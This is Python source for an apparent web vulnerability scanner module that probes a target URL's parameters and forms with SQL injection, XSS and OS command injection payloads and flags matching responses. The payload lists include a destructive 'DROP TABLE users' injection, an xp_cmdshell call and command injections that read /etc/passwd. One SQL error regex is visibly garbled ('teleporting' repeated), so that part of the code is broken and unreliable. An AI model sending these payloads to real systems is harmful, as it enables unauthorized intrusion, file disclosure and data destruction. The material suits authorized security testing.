"""
A03:2021 - Injection Attack Module.

This module implements detection of injection vulnerabilities including:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- LDAP Injection
- XML Injection
"""

import re
import time
import html
from typing import Generator, Dict, Any, List
from urllib.parse import urlparse, parse_qs, urljoin

from attacks.base import Finding, Severity
from attacks.owasp.base_owasp import BaseOWASPAttack, OWASPCategory, OWASPTestCase
from attacks.owasp import OWASPRegistry


@OWASPRegistry.register("a03")
class InjectionAttack(BaseOWASPAttack):
    """
    Injection vulnerability scanner.

    Tests for SQL injection, XSS, command injection, and other injection flaws.
    """

    name = "Injection Scanner"
    description = "Detects injection vulnerabilities including SQL, XSS, and command injection"
    category = OWASPCategory.A03_INJECTION

    # SQL Injection payloads
    SQL_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        '" OR "1"="1',
        "1' OR '1'='1",
        "1 OR 1=1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "admin'--",
        "admin' #",
        "') OR ('1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1; DROP TABLE users--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' AND '1'='1",
        "'; EXEC xp_cmdshell('whoami')--",
    ]

    # SQL error patterns indicating vulnerability
    SQL_ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"Unknown column",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"Zend_Db_(Adapter|Statement)_Mysqli_Exception",
        r"MySQLSyntaxErrorException",
        r"ORA-\d{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"quoted string not properly terminated",
        r"PLS-\d{5}",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError",
        r"org\.postgresql\.util\.PSQLException",
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.",
        r"Exception.*\WSystem\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLITE_CONSTRAINT",
        r"sqlite3\.OperationalError:",
        r"SQLite3::SQLException",
        r"org\.sqlite\.JDBC",
        r"Pdo[.teleporting]*teleporting.*teleporting.*teleporting]Exception",
        r"SQLSTATE\[\d+\]",
        r"Syntax error or access violation",
    ]

    # XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "<img src='x' onerror='alert(1)'>",
        "'\"><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<IMG SRC=javascript:alert('XSS')>",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert('XSS')`>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<svg/onload=alert('XSS')>",
        "<body background=\"javascript:alert('XSS')\">",
        "<input onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<video><source onerror=\"javascript:alert('XSS')\">",
    ]

    # Command injection payloads
    CMD_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "`ls -la`",
        "$(ls -la)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "; id",
        "| id",
        "& id",
        "; whoami",
        "| whoami",
        "& whoami",
        "; uname -a",
        "| uname -a",
        "& dir",
        "| dir",
        "; ping -c 1 127.0.0.1",
        "| ping -n 1 127.0.0.1",
        "; sleep 5",
        "| sleep 5",
        "& timeout 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]

    # Command injection success patterns
    CMD_SUCCESS_PATTERNS = [
        r"root:.*:0:0:",  # /etc/passwd
        r"uid=\d+.*gid=\d+",  # id command
        r"Linux.*\d+\.\d+",  # uname -a
        r"total \d+",  # ls -la
        r"drwx",  # directory listing
        r"-rw-",  # file listing
        r"Volume Serial Number",  # Windows dir
        r"Directory of",  # Windows dir
    ]

    def __init__(self):
        super().__init__()
        self._forms_found: List[Dict] = []
        self._params_found: List[str] = []

    def configure(self, **kwargs) -> None:
        """
        Configure injection attack parameters.

        Args:
            test_sql: Whether to test for SQL injection (default: True)
            test_xss: Whether to test for XSS (default: True)
            test_cmd: Whether to test for command injection (default: True)
            custom_payloads: Additional custom payloads to test
        """
        super().configure(**kwargs)
        self._config["test_sql"] = kwargs.get("test_sql", True)
        self._config["test_xss"] = kwargs.get("test_xss", True)
        self._config["test_cmd"] = kwargs.get("test_cmd", True)
        self._config["custom_payloads"] = kwargs.get("custom_payloads", [])

    def get_config_options(self) -> Dict[str, Any]:
        """Get configuration options."""
        options = super().get_config_options()
        options.update(
            {
                "test_sql": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test for SQL injection",
                },
                "test_xss": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test for Cross-Site Scripting",
                },
                "test_cmd": {
                    "type": "boolean",
                    "default": True,
                    "description": "Test for command injection",
                },
                "custom_payloads": {
                    "type": "array",
                    "default": [],
                    "description": "Additional custom payloads to test",
                },
            }
        )
        return options

    def get_test_cases(self) -> List[OWASPTestCase]:
        """Get test cases for injection vulnerabilities."""
        return [
            OWASPTestCase(
                name="SQL Injection",
                description="Test for SQL injection vulnerabilities",
                category=OWASPCategory.A03_INJECTION,
                payloads=self.SQL_PAYLOADS,
                detection_patterns=self.SQL_ERROR_PATTERNS,
            ),
            OWASPTestCase(
                name="Cross-Site Scripting (XSS)",
                description="Test for XSS vulnerabilities",
                category=OWASPCategory.A03_INJECTION,
                payloads=self.XSS_PAYLOADS,
                detection_patterns=["<script>", "onerror=", "onload="],
            ),
            OWASPTestCase(
                name="Command Injection",
                description="Test for OS command injection",
                category=OWASPCategory.A03_INJECTION,
                payloads=self.CMD_PAYLOADS,
                detection_patterns=self.CMD_SUCCESS_PATTERNS,
            ),
        ]

    def _discover_inputs(self, target: str) -> Dict[str, Any]:
        """
        Discover input points (forms, URL parameters) in the target.

        Returns:
            Dictionary with discovered forms and parameters
        """
        base_url = self._normalize_url(target)
        response = self._make_request(base_url)

        inputs = {
            "forms": [],
            "url_params": [],
            "common_params": [
                "id",
                "user",
                "name",
                "search",
                "query",
                "page",
                "file",
                "path",
                "url",
                "redirect",
                "cmd",
                "exec",
            ],
        }

        if not response:
            return inputs

        # Extract forms from HTML
        inputs["forms"] = self._extract_forms(response.text)

        # Extract URL parameters from links
        link_pattern = r'href=["\']([^"\']*\?[^"\']*)["\']'
        links = re.findall(link_pattern, response.text, re.IGNORECASE)

        for link in links:
            parsed = urlparse(link)
            params = parse_qs(parsed.query)
            inputs["url_params"].extend(params.keys())

        inputs["url_params"] = list(set(inputs["url_params"]))

        return inputs

    def _test_sql_injection(self, target: str, inputs: Dict) -> Generator[Finding, None, None]:
        """Test for SQL injection vulnerabilities."""
        if not self._config.get("test_sql", True):
            return

        base_url = self._normalize_url(target)
        payloads = self.SQL_PAYLOADS + self._config.get("custom_payloads", [])

        # Test URL parameters
        params_to_test = inputs.get("url_params", []) + inputs.get("common_params", [])
        params_to_test = list(set(params_to_test))

        # Limit payloads for speed
        total_tests = len(params_to_test) * len(payloads[:5])
        current_test = 0

        for param in params_to_test:
            for payload in payloads[:5]:  # Use subset for initial scan
                if self.is_cancelled():
                    return

                # Test as URL parameter
                test_url = f"{base_url}?{param}={payload}"
                response = self._make_request(test_url)

                if response:
                    # Check for SQL errors
                    for pattern in self.SQL_ERROR_PATTERNS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            yield Finding(
                                title="SQL Injection Vulnerability",
                                severity=Severity.CRITICAL,
                                description=f"SQL injection vulnerability found in parameter '{param}'",
                                evidence=f"URL: {test_url[:100]}..., "
                                f"Error pattern matched: {pattern[:50]}",
                                remediation="Use parameterized queries or prepared statements. "
                                "Never concatenate user input directly into SQL queries. "
                                "Implement input validation and use ORM frameworks.",
                                metadata={
                                    "parameter": param,
                                    "payload": payload,
                                    "pattern": pattern,
                                },
                            )
                            break

                current_test += 1
                self.set_progress((current_test / total_tests) * 33)
                time.sleep(self._delay_between_requests)

        # Test forms
        for form in inputs.get("forms", []):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            form_inputs = form.get("inputs", [])

            form_url = urljoin(base_url, action) if action else base_url

            for input_name in form_inputs:
                for payload in payloads[:3]:  # Limited payloads per form
                    if self.is_cancelled():
                        return

                    data = {inp: "test" for inp in form_inputs}
                    data[input_name] = payload

                    if method == "POST":
                        response = self._make_request(form_url, method="POST", data=data)
                    else:
                        response = self._make_request(form_url, params=data)

                    if response:
                        for pattern in self.SQL_ERROR_PATTERNS:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                yield Finding(
                                    title="SQL Injection in Form",
                                    severity=Severity.CRITICAL,
                                    description=f"SQL injection found in form field '{input_name}'",
                                    evidence=f"Form: {form_url}, Field: {input_name}, "
                                    f"Method: {method}",
                                    remediation="Use parameterized queries. Validate and sanitize "
                                    "all form inputs before using in database queries.",
                                    metadata={
                                        "form_url": form_url,
                                        "field": input_name,
                                        "method": method,
                                        "payload": payload,
                                    },
                                )
                                break

                    time.sleep(self._delay_between_requests)

    def _test_xss(self, target: str, inputs: Dict) -> Generator[Finding, None, None]:
        """Test for Cross-Site Scripting vulnerabilities."""
        if not self._config.get("test_xss", True):
            return

        base_url = self._normalize_url(target)
        payloads = self.XSS_PAYLOADS

        # Test URL parameters
        params_to_test = inputs.get("url_params", []) + inputs.get("common_params", [])
        params_to_test = list(set(params_to_test))

        total_tests = len(params_to_test) * len(payloads[:5])
        current_test = 0

        for param in params_to_test:
            for payload in payloads[:5]:
                if self.is_cancelled():
                    return

                test_url = f"{base_url}?{param}={payload}"
                response = self._make_request(test_url)

                if response:
                    # Check if payload is reflected in response
                    # For XSS, we check if our payload appears unescaped
                    if payload in response.text:
                        # Verify it's not properly escaped
                        escaped_payload = html.escape(payload)
                        if escaped_payload not in response.text:
                            yield Finding(
                                title="Reflected XSS Vulnerability",
                                severity=Severity.HIGH,
                                description=f"Cross-Site Scripting vulnerability in parameter '{param}'. "
                                "User input is reflected without proper encoding.",
                                evidence=f"URL: {test_url[:100]}..., Payload reflected in response",
                                remediation="Encode all user input before rendering in HTML. "
                                "Use Content-Security-Policy headers. "
                                "Implement input validation and output encoding.",
                                metadata={
                                    "parameter": param,
                                    "payload": payload,
                                    "type": "reflected",
                                },
                            )
                            break

                current_test += 1
                self.set_progress(33 + (current_test / total_tests) * 33)
                time.sleep(self._delay_between_requests)

        # Test forms for XSS
        for form in inputs.get("forms", []):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            form_inputs = form.get("inputs", [])

            form_url = urljoin(base_url, action) if action else base_url

            for input_name in form_inputs:
                for payload in payloads[:3]:
                    if self.is_cancelled():
                        return

                    data = {inp: "test" for inp in form_inputs}
                    data[input_name] = payload

                    if method == "POST":
                        response = self._make_request(form_url, method="POST", data=data)
                    else:
                        response = self._make_request(form_url, params=data)

                    if response and payload in response.text:
                        escaped = html.escape(payload)
                        if escaped not in response.text:
                            yield Finding(
                                title="XSS in Form Input",
                                severity=Severity.HIGH,
                                description=f"XSS vulnerability in form field '{input_name}'",
                                evidence=f"Form: {form_url}, Field: {input_name}",
                                remediation="Properly encode all user input. Use a templating "
                                "engine with automatic escaping.",
                                metadata={
                                    "form_url": form_url,
                                    "field": input_name,
                                    "payload": payload,
                                },
                            )
                            break

                    time.sleep(self._delay_between_requests)

    def _test_command_injection(self, target: str, inputs: Dict) -> Generator[Finding, None, None]:
        """Test for command injection vulnerabilities."""
        if not self._config.get("test_cmd", True):
            return

        base_url = self._normalize_url(target)

        # Command injection is typically in specific parameters
        cmd_params = [
            "cmd",
            "exec",
            "command",
            "ping",
            "query",
            "jump",
            "code",
            "reg",
            "do",
            "func",
            "arg",
            "option",
            "load",
            "process",
            "step",
            "read",
            "function",
            "req",
            "feature",
            "exe",
            "module",
            "payload",
            "run",
            "print",
        ]

        params_to_test = list(set(cmd_params + inputs.get("url_params", [])))
        payloads = self.CMD_PAYLOADS

        total_tests = len(params_to_test) * len(payloads[:5])
        current_test = 0

        for param in params_to_test:
            for payload in payloads[:5]:
                if self.is_cancelled():
                    return

                test_url = f"{base_url}?{param}={payload}"
                response = self._make_request(test_url)

                if response:
                    # Check for command execution indicators
                    for pattern in self.CMD_SUCCESS_PATTERNS:
                        if re.search(pattern, response.text):
                            yield Finding(
                                title="Command Injection Vulnerability",
                                severity=Severity.CRITICAL,
                                description=f"OS command injection in parameter '{param}'",
                                evidence=f"URL: {test_url[:100]}..., "
                                f"Command output pattern found: {pattern[:30]}",
                                remediation="Never pass user input directly to system commands. "
                                "Use allowlists for permitted operations. "
                                "Implement proper input validation and sandboxing.",
                                metadata={
                                    "parameter": param,
                                    "payload": payload,
                                    "pattern": pattern,
                                },
                            )
                            break

                current_test += 1
                self.set_progress(66 + (current_test / total_tests) * 34)
                time.sleep(self._delay_between_requests)

    def run(self, target: str) -> Generator[Finding, None, None]:
        """
        Execute injection attack against the target.

        Args:
            target: Target URL

        Yields:
            Finding objects for each vulnerability discovered
        """
        self.reset()
        self._is_running = True

        yield Finding(
            title="Injection Scan Started",
            severity=Severity.INFO,
            description="Starting scan for injection vulnerabilities (SQL, XSS, Command)",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )

        try:
            # Discover inputs
            inputs = self._discover_inputs(target)

            yield Finding(
                title="Input Discovery Complete",
                severity=Severity.INFO,
                description=f"Found {len(inputs.get('forms', []))} forms and "
                f"{len(inputs.get('url_params', []))} URL parameters",
                evidence=f"Forms: {len(inputs.get('forms', []))}, "
                f"Params: {inputs.get('url_params', [])}",
                remediation="N/A - Informational",
                metadata={"inputs": inputs},
            )

            # Test 1: SQL Injection (0-33%)
            yield from self._test_sql_injection(target, inputs)

            # Test 2: XSS (33-66%)
            yield from self._test_xss(target, inputs)

            # Test 3: Command Injection (66-100%)
            yield from self._test_command_injection(target, inputs)

        finally:
            self._is_running = False
            self.set_progress(100.0)
            self.cleanup()

        yield Finding(
            title="Injection Scan Completed",
            severity=Severity.INFO,
            description="Completed scan for injection vulnerabilities",
            evidence=f"Target: {target}",
            remediation="N/A - Informational",
            metadata={"target": target},
        )
